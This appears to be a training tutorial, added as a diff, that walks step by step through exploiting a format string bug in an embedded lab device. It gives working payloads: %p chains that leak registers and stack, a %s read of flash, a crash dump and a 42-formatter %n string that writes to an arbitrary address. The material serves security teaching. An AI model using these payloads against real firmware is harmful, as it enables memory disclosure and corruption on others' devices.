@@ -1,0 +1,111 @@
+tutorial1 format string bug exploitation
+----------------------------------------
+
+1) Black box exploitation
+
+SD echoes back the command. Try to see if a format string can be echoed.
+> senda %x
+< ready...
+< 20000467
+< Rx: read value at slot x. ex R2
+< ...
+Instead of echoing "%d", SD echoes a integer : there is a format string vulnerability !
+You can learn values of R1, R2 and R3 registers just before echo (we cannot get R0, which points to the command buffer):
+> senda %p-%p-%p
+< 2000046d-1-20000150
+Note: use %p to retrieve pointer values, and for some reason, you have to separate "%p"s with a character (here "-").
+You can see here that both R1 and R3 point to SRAM.
+If you add more "%p", you'll start dumping the stack contents
+> senda %p-%p-%p-%p-%p-%p-%p
+< 20000479-1-20000150-0-0-8002e9c-0 
+Here the stack value at current stack pointer is 0, the one above is 0, and above you can see a pointer on flash.
+You can dump more stack values.
+
+There we can stop a bit. The value in R1 looks interesting, because it seems to increase with the command length.
+> senda %p
+< 20000467
+> senda -%p
+< -20000468
+Looks like it is the end of the command in memory. This gives us the start of the command buffer (0x20000464) in memory, which can be useful for other attacks.
+
+To get more information, you can also try to output data as string :
+> send %s
+Nothing interesting on the output, R1 is probably pointing to data with 0 in it (or not ascii).
+You can also target the flash pointer at 0x08002e9c:
+>senda %p-%p-%p-%p-%p-%s-%p
+<ready...
+<20000479-1-20000150-0-0-Ix: increment value in slot x
+<-0
+Seems this flash address contains application help string ("Ix: increment value in slot x")
+
+Another thing to try is to crash the application using %d on a bad pointer:
+>senda %p-%s
+<ready...
+<Call Stack:
+<  #0  PC: 0x8001200      [strlen + 0x1f]
+<  #1  PC: 0x80004e8      [_PrintfFullNoMb + 0x35f]
+<  #2  PC: 0x80022a0      [printf + 0x1b]
+<  #3  PC: 0x8002c72  in  receive_command(0x20000464 "%p-%s", 0x20000460)   at  C:\julien\SW Attacks\Work\try\TrainingWritingSec
+<  #4  PC: 0x8002bda  in  receive_and_process_command()   at  C:\julien\SW Attacks\Work\try\TrainingWritingSecureFW\tutorial1\ma
+<  #5  PC: 0x8002bf8  in  main(0, 0x08002E9C)   at  C:\julien\SW Attacks\Work\try\TrainingWritingSecureFW\tutorial1\main.c:25
+<  #6  PC: 0x8002ed6      [_call_main + 0xd]
+<
+<User error: Memory access error:
+<Trying to read outside mapped memory at address 0x80000 when PC is 0x8001200.
+<Check your memory configuration.
+<ERROR: Unable to execute: driver error. After the error occurred, the program counter (PC) was 0x8001200.
+This gives you plentiful of useful information, like return addresses, addresses of several functions (strlen at 0x08001200-0x1f, printf at 0x08002295, ...)
+It confirms the command buffer address (0x20000464).
+
+Last thing to try with format string : can you also write to memory using %n ?
+>senda %n
+<ready
+<
+"%n" is not echoed. Seems it is supported. %n write the value represented by the number of bytes printed so far.
+
+
+To exploit this, you could use another observation:
+If you add more "%p" you endup seeing in the stack the command you sent:
+>senda %p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p 
+<20000485-1-20000150-0-0-8002e9c-0-0-8002bdb-20-252d7025
+252d7025 is "%p-%" in ascii
+Or more explicitly :
+>senda AAAA%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p 
+<20000485-1-20000150-0-0-8002e9c-0-0-8002bdb-20-41414141
+
+So if we try to use %n to write to our 0x41414141 address:
+>senda %p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%n 
+<...
+<Trying to write outside mapped memory at address 0x41414141 when PC is 0x80006bc.
+<...
+
+The application tried to write to address 0x41414141 !!!
+
+Unfortunatly, you cannot use this for any practical exploit. 
+Because all interesting addresses in RAM cointain a zero byte (e.g 0x20**00**0150).
+And since you placed this address at the start of the command buffer, this zero terminates the format string before even the first formatter :(
+
+Ideally, you would need your address to be at the end of the command buffer.
+Thankfully, everytime you add a "%p-" formatter, you increase the command buffer by 3, while at the same time the stack location to be acceded is increased by 4.
+So you should be able to catchup with the end of the buffer with enough formatters:
+
+If fact you need 42 of them:
+>senda %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.AAAA 
+<ready...
+<200004e9.1.20000150.0.0.8002e9c.0.0.8002bdb.84.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.2e70252e.252e7025.70252e70.41414141AAAA
+You can see your 0x41414141 ("AAAA") value on the last formatter.
+So if you replace this last "%p" by a "%n":
+>senda %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%n.AAAA 
+< Trying to write outside mapped memory at address 0x41414141 when PC is 0x80006bc.
+
+This time you can really write anywhere, as any zero in your address is not a problem.
+
+Still, there are three issues:
+One, you have a limited control over the value to write. The value is the number of bytes printed, so a very low number like zero would be impossible, and a high value like a pointer also.
+Two, where to write ? Without the binary code, you would have to poke in the dark, hoping to overwrite some interesting data. 
+Three, the SD crashes after the exploit. Because of a buffer overflow. So any modification you could achieve would be gone next time you restart. To go further you would need to control the buffer overflow, but if you can do that it buffer overflow would be much easier to exploit to write where you want.
+
+
+
+
+
